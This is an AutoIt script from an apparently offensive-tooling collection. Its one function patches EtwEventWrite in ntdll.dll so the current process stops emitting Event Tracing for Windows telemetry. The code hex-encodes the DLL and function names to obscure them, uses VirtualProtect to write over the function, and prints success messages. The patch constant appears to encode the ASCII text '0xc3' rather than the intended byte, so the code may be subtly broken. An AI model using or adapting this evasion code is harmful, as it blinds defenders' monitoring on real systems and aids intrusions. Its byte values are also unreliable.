#include <WinAPIRes.au3>
#include <WinAPISys.au3>
#include <String.au3>

#cs --------------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         VIVI (https://github.com/V1V1) | (https://twitter.com/_theVIVI)

 Script Function:
	Patches ETW out of the current process.

 Notes:
    Adapted from - https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
    Credits - Adam Chester (https://twitter.com/_xpn_)

 Example usage:
    https://github.com/V1V1/OffensiveAutoIt/blob/main/Execution/ExecuteAssembly/ExecuteAssembly.au3

#ce --------------------------------------------------------------------------------

Func _PatchETW()

    ConsoleWrite("[*] Patching ETW" & @CRLF & @CRLF)

    ; Define patch bytes - specifically for 64 bit process
    Local $patchBytes = "0x30786333"

    ; Get EtwEventWrite location
    Local $ndllStr = _HexToString("0x6e74646c6c2e646c6c")
    Local $ntdll = _WinAPI_LoadLibrary($ndllStr)
    If $ntdll = 0 Then
        ConsoleWrite("[X] Couldn't load DLL." & @CRLF & @CRLF)
        Exit
    EndIf

    ; Get EtwEventWrite address
    Local $etwEWStr = _HexToString("0x4574774576656e745772697465")
    Local $etwEW = _WinAPI_GetProcAddress($ntdll, $etwEWStr)

    If $etwEW = 0 Then
        ConsoleWrite("[X] Failed to get EtwEventWrite address." & @CRLF & @CRLF)
        Exit
    EndIf

    ; Make memory region writable

    ; Patch length
    Local $patchSize = BinaryLen($patchBytes)

    ; VirtualProtect
    Local $vpCall = DllCall("Kernel32.dll", "int", "VirtualProtect", _
        "ptr", $etwEW, _
        "long", $patchSize, _
        "dword", 0x40, _
        "dword*", 0)

    Local $hProtect = $vpCall[0]
    Local $oldProtect = $vpCall[4]

    ;~ Byte array to the address
    Local $patchBuffer = DllStructCreate("byte[" & $patchSize & "]", $etwEW)
    ;~ Copy patch
    DllStructSetData($patchBuffer, 1, $patchBytes)

    ; Restore region to RX
    Local $resCall = DllCall("Kernel32.dll", "int", "VirtualProtect", _
        "ptr", $etwEW, _
        "long", $patchSize, _
        "dword", $oldProtect, _
        "dword*", 0)

    ConsoleWrite("  [+] ETW patch successful" & @CRLF & @CRLF)

EndFunc ;==>_PatchETW()
